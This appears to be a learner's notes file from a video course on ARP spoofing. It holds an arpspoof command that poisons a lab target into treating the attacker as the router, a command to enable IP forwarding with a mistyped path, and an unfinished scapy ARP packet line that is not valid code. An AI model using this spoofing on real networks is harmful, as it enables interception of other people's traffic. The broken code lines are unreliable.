'''
NOTES from the clip
Kali tool: arpspoof -i eth0 -t 10.0.2.7 10.0.2.1           # this will spoof the target 10.0.2.7 that we are the router (10.0.2.1)
Enable port forwarding on the terminal ; apparently with:   echo 1 > /proc/sys.net/ipv4/ip_forward
'''

import scapy.all as scapy

packet = scapy.ARP(op=2,pdst)               # pdst = ip of the computer, hwdst